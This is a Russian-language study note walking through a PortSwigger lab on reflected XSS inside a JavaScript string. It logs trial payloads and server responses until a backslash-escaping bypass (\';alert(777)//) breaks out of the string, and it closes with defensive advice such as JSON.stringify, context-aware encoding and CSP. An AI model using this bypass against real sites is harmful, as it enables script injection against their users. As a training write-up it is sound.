
когда пытаются защититься от пейлоадов путем подстановки кавычек, слешей и кодирования, то бывает, что появляется способ обойти это используя просто слеш одинарн или двойные `\\    \ ``
+ тупо закомментил все то, что после пейлоада - чтобы не было ошибок синтаксиса двойным слешем
-----

примеры:
```js
вход
`';alert(document.domain)//`

конвертируется в:

`\';alert(document.domain)//`

Теперь вы можете использовать альтернативную полезную нагрузку:

`\';alert(document.domain)//`

который преобразуется в:

`\\';alert(document.domain)//`
```

в папке [[JavaScript_БАЗА]] можно подробнее прочесть по экранирование

лаба https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
задание:
в поиске есть xss
нужно выполнить аллерт 

-----

пейлоад 777
ответ
```html
<script>
 var searchTerms = '777';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

пробую 

'alert("777")
```html
   <script>
var searchTerms = '\'alert(&quot;777&quot;)';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
 </script>
```
кавычки экранируются слешами

пробую двойной слеш
\\'alert("777")
ответ
```html
 <script>
var searchTerms = '\\\'alert(&quot;777&quot;)';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
 </script>
```

пробую `\'alert("777")\'`
ответ
```html
<script>
var searchTerms = '\\'alert(&quot;777&quot;)\\'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
⭐️получилось выйти из строки, но кавычки внутри аллерта экранировались

пробую `\'alert(777)\'`
ответ
```html
<script>
 var searchTerms = '\\'alert(777)\\'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
алерта нет.


пробую `\'alert(777)//`
ответ
```html
<script>
var searchTerms = '\\'alert(777)//';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
#### алерта нет, нужно    ;   чтобы новая строка была! точно!


пробую `\';alert(777)` - нет алерта

пробую `\';alert(777)'` - нет алерта

пробую `\';alert(777)//`  - ПОЛУЧИЛОСЬ!!!

тупо закомментил все то, что после пейлоада - чтобы не было ошибок синтаксиса!

response
```html

<script>
var searchTerms = '\\';alert(777)//';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

------



#### выводы по лабе:

1. Защита на основе экранирования кавычек слешами не работает, если злоумышленник может экранировать сам экранирующий слеш


2. Уязвимость возникает там, где сервер экранирует спецсимволы для JavaScript, но не учитывает возможность экранирования самого слеша


3. Для успешной атаки нужно не просто закрыть строку, но и правильно завершить синтаксис (например, поставить точку с запятой и закомментировать остаток кода)
   

#### как защититься:

1. Не пытайтесь экранировать вручную. Используйте JSON.stringify() для вставки данных в JavaScript


2. Применяйте правильное кодирование для конкретного контекста: если данные идут в JS, используйте экранирование для JS, а не просто подстановку слешей


3. Используйте Content Security Policy (CSP) с запретом на инлайн-скрипты


4. Лучше вообще не вставлять пользовательские данные напрямую в JS-код, а хранить их в data-атрибутах и считывать через DOM